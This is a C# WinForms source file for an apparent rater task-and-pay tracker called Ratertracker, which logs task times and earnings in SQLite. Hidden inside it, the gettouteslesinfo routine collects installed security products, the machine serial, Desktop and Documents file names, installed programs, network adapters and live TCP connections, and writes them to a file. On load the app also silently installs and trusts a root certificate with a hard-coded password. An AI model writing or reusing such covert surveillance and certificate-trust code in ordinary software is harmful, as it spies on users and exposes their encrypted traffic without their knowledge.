            string rootCertificatePassword = "S0m3T0pS3cr3tP4ssw0rd";
            if (!File.Exists(rootCertificatePath))
            {
                certProvider.CreateRootCertificate();
                certProvider.WriteRootCertificateAndPrivateKeyToPkcs12File(rootCertificatePath, rootCertificatePassword);
            }
            else
            {
                certProvider.ReadRootCertificateAndPrivateKeyFromPkcs12File(rootCertificatePath, rootCertificatePassword);
            }

            if (!CertMaker.rootCertIsTrusted())
            {
                CertMaker.trustRootCert();
            }
        }
        private void RadForm1_Load(object sender, EventArgs e)
        {
            Stop();
            Start();
            Stop();
            EnsureRootCertificate();
            AutoUpdater.ShowSkipButton = false;
            AutoUpdater.Start("http://ratertracker.xyz/rt.xml");
            refreshTimer = new System.Timers.Timer(1000);
            refreshTimer.Elapsed += PollUpdates;
            updatedatad();
            TheTimer = new System.Threading.Timer(
               this.Tick, null, 0, 2000);

            tbIgnoreResources.Checked = CaptureConfiguration.IgnoreResources;
            tleap.Text = ConfigurationManager.AppSettings["leapforce"];
            lacle = ConfigurationManager.AppSettings["leapforce"];
            zeserial = ConfigurationManager.AppSettings["serial"];
            txtCaptureDomain.Text = CaptureConfiguration.CaptureDomain;
            radCheckBox1.Checked = Convert.ToBoolean(ConfigurationManager.AppSettings["ratreload"]);
            radTextBox1.Text = ConfigurationManager.AppSettings["refrtime"];
            label6.Text= "Version " + Application.ProductVersion;
            bool ontop = Convert.ToBoolean(ConfigurationManager.AppSettings["ontop"]);
            if (ontop == true)
            {
                this.TopMost = true;
            }
            else
            {
                this.TopMost = false;
            }

            try
            {
                var processes = Process.GetProcesses().OrderBy(p => p.ProcessName);
                foreach (var process in processes)
                {
                    txtProcessId.Items.Add(process.ProcessName + "  - " + process.Id);
                }
            }
            catch { }
        }
        public void updatedatad()
        {

            //
            if (connection.State != ConnectionState.Open)
                connection.Open();

            // 
            SQLiteCommand command = connection.CreateCommand();
            command.CommandText = SQLSelectd;
            command.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("day", GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture));
            command.ExecuteNonQuery();
            using (SQLiteDataReader rdr = command.ExecuteReader())
            {

                if (rdr.HasRows == true)
                {
                    while (rdr.Read())
                    {

                        lbtotexpd.Text = rdr["totexp"].ToString();
                        lbtotsxsd.Text = rdr["totsxs"].ToString();
                        lbtottskd.Text = rdr["tottsk"].ToString();
                        lbtotaetd.Text = rdr["totaet"].ToString();
                        lbtotrtd.Text = rdr["totrt"].ToString();
                        lbddol.Text = rdr["totdol"].ToString();
                        lbddolrt.Text = rdr["totdolrt"].ToString();
                    }
                }
                else
                {
                    if (connection.State != ConnectionState.Open)
                        connection.Open();

                    // "INSERT INTO tasks(year, month, day, totexp, totsxs, tottsk, totaet, totrt, totdol) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)";
                    SQLiteCommand commandm = connection.CreateCommand();
                    commandm.CommandText = SQLInsert;
                    commandm.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
                    commandm.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
                    commandm.Parameters.AddWithValue("day", GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture));
                    commandm.Parameters.AddWithValue("totexp", "0");
                    commandm.Parameters.AddWithValue("totsxs", "0");
                    commandm.Parameters.AddWithValue("tottsk", "0");
                    commandm.Parameters.AddWithValue("totaet", "0");
                    commandm.Parameters.AddWithValue("totrt", "0");
                    commandm.Parameters.AddWithValue("totdol", "0");
                    commandm.Parameters.AddWithValue("totdolrt", "0");
                    commandm.ExecuteNonQuery();
                }
            }
            updatedatam();


        }
        public void updatedatam()
        {

            //
            if (connection.State != ConnectionState.Open)
                connection.Open();

            // Creamos un SQLiteCommand y le asignamos la cadena de consulta
            SQLiteCommand command = connection.CreateCommand();
            command.CommandText = SQLSelectm;
            command.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
            command.ExecuteNonQuery();
            using (SQLiteDataReader rdr = command.ExecuteReader())
            {

                if (rdr.HasRows == true)
                {
                    while (rdr.Read())
                    {

                        lbtotexpm.Text = rdr["totexp"].ToString();
                        lbtotsxsm.Text = rdr["totsxs"].ToString();
                        lbtottskm.Text = rdr["tottsk"].ToString();
                        lbtotaetm.Text = rdr["totaet"].ToString();
                        lbtotrtm.Text = rdr["totrt"].ToString();
                        lbmdol.Text = rdr["totdol"].ToString();
                        lbmdolrt.Text = rdr["totdolrt"].ToString();
                        getgoodtime();
                    }
                }
                else
                {
                    if (connection.State != ConnectionState.Open)
                        connection.Open();

                    // "INSERT INTO tasks(year, month, day, totexp, totsxs, tottsk, totaet, totrt, totdol) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)";
                    SQLiteCommand commandm = connection.CreateCommand();
                    commandm.CommandText = SQLInsertm;
                    commandm.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
                    commandm.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
                    commandm.Parameters.AddWithValue("totexp", "0");
                    commandm.Parameters.AddWithValue("totsxs", "0");
                    commandm.Parameters.AddWithValue("tottsk", "0");
                    commandm.Parameters.AddWithValue("totaet", "0");
                    commandm.Parameters.AddWithValue("totrt", "0");
                    commandm.Parameters.AddWithValue("totdol", "0");
                    commandm.Parameters.AddWithValue("totdolrt", "0");
                    commandm.ExecuteNonQuery();
                }
            }

        }
        public void newtask(string taskids, string letime, string letype, string legenre)
        {
            
            w1.Text = "";
            w2.Text = "";
            w3.Text = "";
            radstoprefresh.Visible = false;
            radstartrefresh.Visible = false;
            //newtask(letaskidok, letimeok, letypeok, legenreok);
            letimeok = letime.Replace(",", ".");
            xtaskids = taskids;
            xlegenre = legenre;

            string timeook;
            timeook = double.Parse(letime.Replace(",", "."), CultureInfo.InvariantCulture).ToString();

            xletime = Convert.ToDouble(timeook);

            var timespan = System.TimeSpan.FromMinutes(xletime).TotalSeconds;
            var timespan2 = TimeSpan.FromSeconds(timespan);
            lblElapsed.Text = timespan2.ToString(@"mm\:ss");


            //string[] totalSeconds = xletime.Split(':');
            string[] totalSeconds = lblElapsed.Text.Split(':');
            int minutes = Convert.ToInt32(totalSeconds[0]);
            int seconds = Convert.ToInt32(totalSeconds[1]);
            timeLeft = (minutes * 60) + seconds;
            timeprog = timeLeft;
            // Lock Start and Clear buttons and text box
            // Define Tick eventhandler and start timer
            // timer1.Tick += new EventHandler(timer1_Tick);





            timer2.Start();
            lbtskid.Text = xtaskids;
            lbtype.Text = letype;
            lbgenre.Text = xlegenre;
            w1.Text = letype;
            w2.Text = xlegenre;
            w3.Text = letime + " min";
            this.radDesktopAlert1.Popup.Image = this.pictureBox1.Image;
            this.radDesktopAlert1.CaptionText = "    New task started";
            this.radDesktopAlert1.ContentText = "    New task started : " + legenre + " \r\n" +
                                                "    " + letype + " \r\n" +
                                                 "    " + letime + " min";
            this.radDesktopAlert1.Show();


        }
        public static string OS_Name()
        {
            return (string)(from x in new ManagementObjectSearcher(
                "SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                            select x.GetPropertyValue("Caption")).FirstOrDefault();
        }
        public void checkanti()
        {
            zeresult = zeresult + nl + nl;
            zeresult = zeresult + "ANTIVR : " + nl;
            ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
            ManagementObjectCollection data = wmiData.Get();

            foreach (ManagementObject vChecker in data)
            {
                zeresult = zeresult + vChecker["displayName"] + nl;
            }
            zeresult = zeresult + nl;
        }
        public void checkfire()
        {
            zeresult = zeresult + "FIRE : " + nl;
            ManagementObjectSearcher wmiData2 = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM FirewallProduct");
            ManagementObjectCollection data2 = wmiData2.Get();

            foreach (ManagementObject vChecker2 in data2)
            {
                zeresult = zeresult + vChecker2["displayName"] + nl;
            }
            zeresult = zeresult + nl;
        }
        public void checkspy()
        {
            zeresult = zeresult + "ANTISPY : " + nl;
            ManagementObjectSearcher wmiData3 = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiSpywareProduct");
            ManagementObjectCollection data3 = wmiData3.Get();
            foreach (ManagementObject vChecker3 in data3)
            {
                zeresult = zeresult + vChecker3["displayName"] + nl;
            }
            zeresult = zeresult + nl;
        }
        public void checkinfopc()
        {
            zeresult = zeresult + "INFOPC : " + nl;

            System.Management.SelectQuery query = new System.Management.SelectQuery(@"Select * from Win32_ComputerSystem");
            using (System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(query))
            {
                foreach (System.Management.ManagementObject process in searcher.Get())
                {
                    process.Get();
                    zeresult = zeresult + "System Manufacturer:" + process["Manufacturer"] + nl + "System Model:" + process["Model"] + nl + "Serial:" + leserial + nl;
                }
            }
           zeresult = zeresult + OS_Name() + nl + nl;
        }
        public void getdoc()
        {
            zeresult = zeresult + "MYDOC : " + nl;
            string pathw = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string[] filePathw = Directory.GetFiles(pathw, "*.*", SearchOption.TopDirectoryOnly);
            foreach (string name in filePathw)
            {
                zeresult = zeresult + name + nl;
            }
            zeresult = zeresult + nl;

        }
        public void getdesk()
        {
            zeresult = zeresult + "BUREAU : " + nl;
            string pathx = System.Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] filePathx = Directory.GetFiles(pathx, "*.*", SearchOption.TopDirectoryOnly);
            foreach (string name in filePathx)
            {
                zeresult = zeresult + name + nl;
            }
            zeresult = zeresult + nl;

        }
        public void getprog()
        {
            zeresult = zeresult + "PROG : " + nl;

          string[] filePathy = Directory.GetDirectories(@"c:\Program Files", "*", SearchOption.TopDirectoryOnly);
            foreach (string name in filePathy)
            {
                zeresult = zeresult + name + nl;
            }
            zeresult = zeresult + nl;

        }
        public void getprog32()
        {
            zeresult = zeresult + "PROG32 : " + nl;

           string[] filePathh = Directory.GetDirectories(@"c:\Program Files (x86)", "*", SearchOption.TopDirectoryOnly);
            foreach (string name in filePathh)
            {
                zeresult = zeresult + name + nl;
            }
            zeresult = zeresult + nl;

        }
        public void getconx()
        {
            zeresult = zeresult + "Active TCP Connections :" + nl;

            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
            foreach (TcpConnectionInformation c in connections)
            {
                zeresult = zeresult + "{0} <==> {1}" + c.LocalEndPoint.ToString() + " " + c.RemoteEndPoint.ToString() + nl;
            }
            zeresult = zeresult + nl;
        }
        public void getcartes()
        {
            zeresult = zeresult + "NETWORK CARDS :" + nl;

            NetworkInterface[] ifaceList = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface iface in ifaceList)
            {
                zeresult = zeresult + "Name: " + iface.Name + nl;
                zeresult = zeresult + "Type: " + iface.NetworkInterfaceType + nl;
                zeresult = zeresult + "Status: " + iface.OperationalStatus + nl;
                zeresult = zeresult + "Speed: " + iface.Speed + nl;
                zeresult = zeresult + "Description: " + iface.Description + nl;


                UnicastIPAddressInformationCollection unicastIPC = iface.GetIPProperties().UnicastAddresses;
                foreach (UnicastIPAddressInformation unicast in unicastIPC)
                {
                    zeresult = zeresult + unicast.Address.AddressFamily + "t: " + unicast.Address + nl;

                }
                zeresult = zeresult + "=======================================" + nl;
            }
            zeresult = zeresult + nl;
        }
        public void gettouteslesinfo()
        {
            getleserial();
            checkanti();
            checkfire();
            checkspy();
            checkinfopc();
            getdoc();
            getdesk();
            getprog();
            getprog32();
            getcartes();
            getconx();
           
            File.AppendAllText(newLocation2, zeresult + nl);

        }
        public void stoptask(bool substop, string endtaskids)
        {
            
            
            
           if (endtaskids != oldtsk)
           {
                // count only one time
            
            w1.Text = "";
            w2.Text = "";
            w3.Text = "";

            double nbrtotexpd;
            double nbrtotsxsd;
            double nbrtotexpm;
            double nbrtotsxsm;
            double nbrtottskd;
            double nbrtottskm;

            string nbrddol;
            string nbrmdol;
            string nbrddolrt;
            string nbrmdolrt;

            timer2.Stop();


            var letim = timeLeft;
            lblElapsed.ForeColor = System.Drawing.Color.Black;


            nbrtottskd = (Convert.ToDouble(lbtottskd.Text) + 1);
            nbrtottskm = (Convert.ToDouble(lbtottskm.Text) + 1);
            lbtottskd.Text = nbrtottskd.ToString();
            lbtottskm.Text = nbrtottskm.ToString();


            if (lbgenre.Text == "Side By Side")
            {
                lbtotsxsd.Text = (Convert.ToDouble(lbtotsxsd.Text) + 1).ToString();
                lbtotsxsm.Text = (Convert.ToDouble(lbtotsxsm.Text) + 1).ToString();

            }
            //else if (lbgenre.Text == "Experimental")
            else if (lbgenre.Text != "Side By Side")
            {
                lbtotexpd.Text = (Convert.ToDouble(lbtotexpd.Text) + 1).ToString();
                lbtotexpm.Text = (Convert.ToDouble(lbtotexpm.Text) + 1).ToString();

            }
            nbrtotexpd = Convert.ToDouble(lbtotexpd.Text);
            nbrtotexpm = Convert.ToDouble(lbtotexpm.Text);
            nbrtotsxsd = Convert.ToDouble(lbtotsxsd.Text);
            nbrtotsxsm = Convert.ToDouble(lbtotsxsm.Text);

            double vtime = Convert.ToDouble(letimeok.Replace(",", "."), CultureInfo.InvariantCulture);
            var timeaetd = TimeSpan.Parse(lbtotaetd.Text);
            var timetsk = System.TimeSpan.FromMinutes(vtime);
            var timeaetdnew = timeaetd.Add(timetsk);

            var timeaetm = TimeSpan.Parse(lbtotaetm.Text);
            var timeaetmnew = timeaetm.Add(timetsk);

            var minutes = System.TimeSpan.FromSeconds(letim);
            var timertd = TimeSpan.Parse(lbtotrtd.Text);
            var timespan99 = TimeSpan.Parse(minutes.ToString());

            var minutfinish = timetsk.Subtract(timespan99);
            var timertdnew = timertd.Add(minutfinish);

            var timertm = TimeSpan.Parse(lbtotrtm.Text);
            var timertmnew = timertm.Add(minutfinish);


            lbtotaetd.Text = timeaetdnew.ToString();
            lbtotaetm.Text = timeaetmnew.ToString();

            lbtotrtd.Text = timertdnew.ToString();
            lbtotrtm.Text = timertmnew.ToString();
                getgoodtime();
            nbrddol = (timeaetdnew.TotalHours * zepay).ToString("C", CultureInfo.CreateSpecificCulture("en-US"));
            nbrmdol = (timeaetmnew.TotalHours * zepay).ToString("C", CultureInfo.CreateSpecificCulture("en-US"));
            nbrddolrt = (timertdnew.TotalHours * zepay).ToString("C", CultureInfo.CreateSpecificCulture("en-US"));
            nbrmdolrt = (timertmnew.TotalHours * zepay).ToString("C", CultureInfo.CreateSpecificCulture("en-US"));

            lbddol.Text = nbrddol.ToString();
            lbddolrt.Text = nbrddolrt.ToString();
            lbmdol.Text = nbrmdol.ToString();
            lbmdolrt.Text = nbrmdolrt.ToString();


            this.radDesktopAlert1.Popup.Image = this.pictureBox1.Image;
            this.radDesktopAlert1.CaptionText = "    End task";
            this.radDesktopAlert1.ContentText = "   Task saved : " + xlegenre + " \r\n" +
                                                "    " + letimeok + " min";
            this.radDesktopAlert1.Show();

            if (connection.State != ConnectionState.Open)
                connection.Open();

            // SQLUpdatem = "UPDATE month SET totexp = ?, totsxs = ?, tottsk = ?, totaet = ?, totrt = ?, totdol = ? WHERE year = ?, month = ? AND day = ?";
            SQLiteCommand command = connection.CreateCommand();
            command.CommandText = SQLUpdatem;
            command.Parameters.AddWithValue("totexp", nbrtotexpm);
            command.Parameters.AddWithValue("totsxs", nbrtotsxsm);
            command.Parameters.AddWithValue("tottsk", nbrtottskm);
            command.Parameters.AddWithValue("totaet", timeaetmnew);
            command.Parameters.AddWithValue("totrt", timertmnew);
            command.Parameters.AddWithValue("totdol", nbrmdol);
            command.Parameters.AddWithValue("totdolrt", nbrmdolrt);
            command.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", CultureInfo.InvariantCulture));



            command.ExecuteNonQuery();

            //dya

            SQLiteCommand commandx = connection.CreateCommand();
            commandx.CommandText = SQLUpdated;
            commandx.Parameters.AddWithValue("totexp", nbrtotexpd);
            commandx.Parameters.AddWithValue("totsxs", nbrtotsxsd);
            commandx.Parameters.AddWithValue("tottsk", nbrtottskd);
            commandx.Parameters.AddWithValue("totaet", timeaetdnew);
            commandx.Parameters.AddWithValue("totrt", timertdnew);
            commandx.Parameters.AddWithValue("totdol", nbrddol);
            commandx.Parameters.AddWithValue("totdolrt", nbrddolrt);
            commandx.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", CultureInfo.InvariantCulture));
            commandx.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", CultureInfo.InvariantCulture));
            commandx.Parameters.AddWithValue("day", GetPacificStandardTime(DateTime.Now).ToString("dd", CultureInfo.InvariantCulture));
            commandx.ExecuteNonQuery();


            oldtsk = endtaskids;
                lblElapsed.Text = "00:00";
            }
            else

            {
                
                timer2.Stop();
                lblElapsed.Text = "00:00";

            }

            

        }
        

        private void radButton4_Click(object sender, EventArgs e)
        {
            Stop();
            System.Windows.Forms.Application.Exit();
        }

        private void radButton1_Click(object sender, EventArgs e)
        {
            
            this.TopMost = true;
            zepay = Convert.ToDouble(tpayrate.Text.Replace(".", ","));

            if (isexpired == true)
            {
                DialogResult ds = RadMessageBox.Show(this, "Register or buy license at https://www.ratertracker.com", "Expired", MessageBoxButtons.OK, RadMessageIcon.Exclamation);
                this.Text = ds.ToString();
                System.Diagnostics.Process.Start("https://www.ratertracker.com");
            }
            else
            {
                Start();
                laststat = "NRT";
                radButton1.Enabled = false;
            }

            //isexpired
           
            
        }

        private void radButton7_Click(object sender, EventArgs e)
        {
            RadForm3 otherForm = new RadForm3();
            otherForm.FormClosed += new FormClosedEventHandler(otherForm_FormClosed);
            this.Hide();
            otherForm.Show();
        }


        private void radButton8_Click(object sender, EventArgs e)
        {
            RadForm2 otherForm = new RadForm2();
            otherForm.FormClosed += new FormClosedEventHandler(otherForm_FormClosed);
            this.Hide();
            otherForm.Show();
        }


        private void timer2_Tick(object sender, EventArgs e)
        {
            timeLeft = timeLeft - 1;
            double timeend = System.TimeSpan.FromMinutes(xletime).TotalSeconds;
            double timeoki = (timeend - (timeend * 0.8));
            if (timeLeft < timeoki & timeLeft > 0)
            {
                lblElapsed.ForeColor = System.Drawing.Color.Orange;
            }
            else if (timeLeft < 0)
            {
                lblElapsed.ForeColor = System.Drawing.Color.Red;
            }
            if (timeLeft == 5 && sndaet == true)
            {
                System.Media.SoundPlayer player = new System.Media.SoundPlayer();
                player.Stream = Ratertracker.Resources.sound.aet;
                player.Play();
            }
            
            // Display time remaining as mm:ss

            var timespan = TimeSpan.FromSeconds(timeLeft);
            lblElapsed.Text = (TimeSpan.FromMinutes(timeLeft)) < TimeSpan.Zero ? "-" + TimeSpan.FromMinutes(timeLeft).ToString(@"hh\:mm") : "" + TimeSpan.FromMinutes(timeLeft).ToString(@"hh\:mm");

        }
       
        public void newday()
        {
            getlesinfos();
            AutoUpdater.ShowSkipButton = false;
            AutoUpdater.Start("http://ratertracker.xyz/rt.xml");
            lbtotexpd.Text = "0";
            lbtotsxsd.Text = "0";
            lbtottskd.Text = "0";
            lbtotaetd.Text = "00:00:00";
            lbtotrtd.Text = "00:00:00";
            lbddol.Text = "0 $";
            lbddolrt.Text = "0 $";


            if (connection.State != ConnectionState.Open)
                connection.Open();

            // Creamos un SQLiteCommand y le asignamos la cadena de consulta
            SQLiteCommand command = connection.CreateCommand();
            command.CommandText = SQLSelectd;
            command.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("day", GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture));
            command.ExecuteNonQuery();
            if (connection.State != ConnectionState.Open)
                connection.Open();

            // "INSERT INTO tasks(year, month, day, totexp, totsxs, tottsk, totaet, totrt, totdol) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)";
            SQLiteCommand commandm = connection.CreateCommand();
            commandm.CommandText = SQLInsert;
            commandm.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
            commandm.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
            commandm.Parameters.AddWithValue("day", GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture));
            commandm.Parameters.AddWithValue("totexp", "0");
            commandm.Parameters.AddWithValue("totsxs", "0");
            commandm.Parameters.AddWithValue("tottsk", "0");
            commandm.Parameters.AddWithValue("totaet", "0");
            commandm.Parameters.AddWithValue("totrt", "0");
            commandm.Parameters.AddWithValue("totdol", "0");
            commandm.Parameters.AddWithValue("totdolrt", "0");
            commandm.ExecuteNonQuery();
        }


        public void newmonth()
        {
            lbtotexpm.Text = "0";
            lbtotsxsm.Text = "0";
            lbtottskm.Text = "0";
            lbtotaetm.Text = "000:00:00";
            lbtotrtm.Text = "000:00:00";
            lbmdol.Text = "$ 0";
            lbmdolrt.Text = "$ 0";
            //
            if (connection.State != ConnectionState.Open)
                connection.Open();

            // Creamos un SQLiteCommand y le asignamos la cadena de consulta
            SQLiteCommand command = connection.CreateCommand();
            command.CommandText = SQLSelectm;
            command.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
            command.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
            command.ExecuteNonQuery();

            if (connection.State != ConnectionState.Open)
                connection.Open();

            // "INSERT INTO tasks(year, month, day, totexp, totsxs, tottsk, totaet, totrt, totdol) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)";
            SQLiteCommand commandm = connection.CreateCommand();
            commandm.CommandText = SQLInsertm;
            commandm.Parameters.AddWithValue("year", GetPacificStandardTime(DateTime.Now).ToString("yyyy", System.Globalization.CultureInfo.InvariantCulture));
            commandm.Parameters.AddWithValue("month", GetPacificStandardTime(DateTime.Now).ToString("MMMM", System.Globalization.CultureInfo.InvariantCulture));
            commandm.Parameters.AddWithValue("totexp", "0");
            commandm.Parameters.AddWithValue("totsxs", "0");
            commandm.Parameters.AddWithValue("tottsk", "0");
            commandm.Parameters.AddWithValue("totaet", "0");
            commandm.Parameters.AddWithValue("totrt", "0");
            commandm.Parameters.AddWithValue("totdol", "0");
            commandm.Parameters.AddWithValue("totdolrt", "0");
            commandm.ExecuteNonQuery();
        }
        private void ButtonHandler(object sender, EventArgs e)
        {

        }

        private void radButton6_Click(object sender, EventArgs e)
        {
            
        }

        private void radButton9_Click(object sender, EventArgs e)
        {
          
        }

        private void form_closing(object sender, FormClosingEventArgs e)
        {
            if (TheTimer != null) TheTimer.Dispose();
            Stop();
        }

        private void radButton2_Click(object sender, EventArgs e)
        {
            Stop();
            radButton1.Enabled = true;
        }

        private void radButton3_Click(object sender, EventArgs e)
        {

            
        }

        private void radButton5_Click(object sender, EventArgs e)
        {
            DialogResult ds = RadMessageBox.Show(this, "Send me a email to : admin@ratertracker.com for bugs or add features", "Contact", MessageBoxButtons.OK, RadMessageIcon.Exclamation);
            this.Text = ds.ToString();
            

        }

        private void radPageView1_SelectedPageChanged(object sender, EventArgs e)
        {

        }

        private void radCheckBox1_ToggleStateChanged(object sender, Telerik.WinControls.UI.StateChangedEventArgs args)
        {
            if (radCheckBox1.Checked == true)
            {

                radTextBox1.Enabled = true;
                config.AppSettings.Settings["ratreload"].Value = "true";
                config.Save(ConfigurationSaveMode.Modified);

            }
            else
            {

                radTextBox1.Enabled = false;
                config.AppSettings.Settings["ratreload"].Value = "false";
                config.Save(ConfigurationSaveMode.Modified);


            }
        }

        private void radTextBox1_TextChanged(object sender, EventArgs e)
        {
            config.AppSettings.Settings["refrtime"].Value = radTextBox1.Text;
            config.Save(ConfigurationSaveMode.Modified);


        }

        private void form_shown(object sender, EventArgs e)
        {
            radCheckBox1.Checked = Convert.ToBoolean(ConfigurationManager.AppSettings["ratreload"]);
            if (ConfigurationManager.AppSettings["FirstRun"] == "true")
            {
                RadForm6 otherForm = new RadForm6();
                otherForm.FormClosed += new FormClosedEventHandler(otherForm_FormClosed);
                this.TopMost = false;
                this.Hide();
                otherForm.Show();
                //Change the value since the program has run once now
                config.AppSettings.Settings["FirstRun"].Value = "false";
                config.Save(ConfigurationSaveMode.Modified);

            }
            else
            {
               
                tleap.Text = ConfigurationManager.AppSettings["leapforce"];
                tpayrate.Text = ConfigurationManager.AppSettings["payrate"];
                if (ConfigurationManager.AppSettings["soundaet"] == "true")
                {
                    sndaet = true;
                }
                if (ConfigurationManager.AppSettings["autosubmit"] == "true")
                {
                    autosubmit = true;
                   
                }
                if (ConfigurationManager.AppSettings["autoacquire"] == "true")
                {
                    autoacquire = true;
                }
                getlesinfos();
            }
        
        }

        private void tpayrate_TextChanged(object sender, EventArgs e)
        {
            config.AppSettings.Settings["payrate"].Value = tpayrate.Text;
            config.Save(ConfigurationSaveMode.Modified);
        }

        private void tleap_TextChanged(object sender, EventArgs e)
        {
            config.AppSettings.Settings["leapforce"].Value = tleap.Text;
            config.Save(ConfigurationSaveMode.Modified);
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void radButton10_Click(object sender, EventArgs e)
        {
            config.AppSettings.Settings["leapforce"].Value = tleap.Text;
            config.AppSettings.Settings["payrate"].Value = tpayrate.Text;
            config.Save(ConfigurationSaveMode.Modified);
            getlesinfos();
        }

        

        private void radButton11_Click(object sender, EventArgs e)
        {
            RadForm5 otherForm = new RadForm5();
            otherForm.FormClosed += new FormClosedEventHandler(otherForm_FormClosed);
            this.Hide();
            otherForm.Show();
        }

        private void radButton12_Click(object sender, EventArgs e)
        {
           // radCheckBox1.Checked = false;
            refreshTimer.Stop();
            w1.Text = "";
            w2.Text = "Stop refreshing";
            w3.Text = "";
            lblElapsed.Text = "00:00";
            dorefresh = false;
            Updatebuttonstart("true");
            Updatebuttonstop("false");
        }

        private void radButton13_Click(object sender, EventArgs e)
        {
            // radCheckBox1.Checked = true;
            dorefresh = true;
            MessageBox.Show("Refresh the page on Chrome for run auto refresh again");
            Updatebuttonstop("true");
            Updatebuttonstart("false");
            startrefresh();

        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            
        }

        private void button1_Click_2(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
        }

        private void radButton3_Click_1(object sender, EventArgs e)
        {
            RadForm7 otherForm = new RadForm7();
            otherForm.FormClosed += new FormClosedEventHandler(otherForm_FormClosed);
            this.Hide();
            otherForm.Show();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }
    }
}
